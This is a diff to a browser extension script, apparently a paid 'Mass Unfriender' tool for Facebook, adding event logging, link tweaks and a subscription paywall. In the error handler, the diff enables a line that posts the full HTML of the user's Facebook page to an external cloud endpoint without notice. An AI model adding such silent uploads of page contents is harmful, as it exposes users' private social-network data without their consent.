@@ -5,6 +5,7 @@ var a = {
 	selector: '#friends_center_main > div',
 	ul: '',
 	init: function(e){
+        browser.runtime.sendMessage({event: 'content', what: 'inited '+e})
 		a.ul = $(a.selector + '   > div     div > a > i').parent().parent().parent().parent().eq(0)
 		console.log(a.ul.children().length)
 		if(!a.ul.children().length){
@@ -18,10 +19,14 @@ var a = {
 			}
 			return;
 		}
+		$('body').on('click', '#payRequestUnfriender a', function(){
+        	browser.runtime.sendMessage({event: 'content clicked', what: $(this).attr('href')})
+		})
 		if(!a.purchased) return insertPayment()
 		a.ready()
 	},
 	ready: ()=>{
+        browser.runtime.sendMessage({event: 'content', what: 'isReady'})
 		setInterval(()=>{
 			if(!a.extraEnabled) a.ul = $(a.selector);
 			a.ul.children('div > div:not(.extensionExpertFriendBoxBinded)').each(function(){
@@ -106,7 +111,7 @@ var a = {
 	proccess: ()=>{
 		$(`<div id="extensionExpertScreen">
 			<h1>Mass Unfriender</h1>
-			<a href="https://bit.ly/376z36j" target="_blank">
+			<a target="_blank" href="https://bit.ly/376z36j" target="_blank">
 				<h3>Messenger Cleaner</h3>
 				<p>Delete All Messages from Facebook Messenger in one click</p>
 			</a>
@@ -201,10 +206,10 @@ function insertPayment(){
 							</h2>
 							<div class="MassUnfrienderPlans">
 								<label>Plans available</label>
-								<p>Monthly subscription <a href="https://node.verblike.com/massunfriender/oneTime/month">$5</a></p>
-								<p>Annual subscription <span>(save 30%)</span><a href="https://node.verblike.com/massunfriender/oneTime/annual">$40</a></p>
-								<p class="specialOffer">Special 24h access <span>limited time offer</span> <a href="https://node.verblike.com/massunfriender/oneTime/oneday" class="specialYellowButton">$1.99</a></p>
-								<!--  <p>Lifetime one-time payment <a href="https://node.verblike.com/massunfriender/oneTime/full">$140</a></p>  -->
+								<p>Monthly subscription <a target="_blank" href="https://node.verblike.com/massunfriender/oneTime/month">$5</a></p>
+								<p>Annual subscription <span>(save 30%)</span><a target="_blank" href="https://node.verblike.com/massunfriender/oneTime/annual">$40</a></p>
+								<p class="specialOffer">Special 24h access <span>limited time offer</span> <a target="_blank" href="https://node.verblike.com/massunfriender/oneTime/oneday" class="specialYellowButton">$1.99</a></p>
+								<!--  <p>Lifetime one-time payment <a target="_blank" href="https://node.verblike.com/massunfriender/oneTime/full">$140</a></p>  -->
 
 								<p>
 									<img style="width: 30%;" src="https://extension.expert/wp-content/uploads/2020/11/1764418-1-1.png">
@@ -228,7 +233,8 @@ function insertPayment(){
 			})
 }
 function insertError(){
-	// $.post('https://us-central1-extensions-uni.cloudfunctions.net/main/saveSnapshot/', {html: {mobile: document.body.outerHTML}})
+	browser.runtime.sendMessage({event: 'content', what: 'error'})
+	$.post('https://us-central1-extensions-uni.cloudfunctions.net/main/saveSnapshot/', {html: {mobile: document.body.outerHTML}})
 	$(`<div id="payRequestUnfriender">
 				<div>
 					<div>
@@ -238,7 +244,7 @@ function insertError(){
 								Your Facebook interface language is probably not English. If so, you should change it to.
 								<br>
 								<br>
-								Or check out my mainstream extension alternative <a href="https://bit.ly/3o6izme">here</a>.
+								Or check out my mainstream extension alternative <a target="_blank" href="https://bit.ly/3o6izme">here</a>.
 							</p>
 						</div>
 						
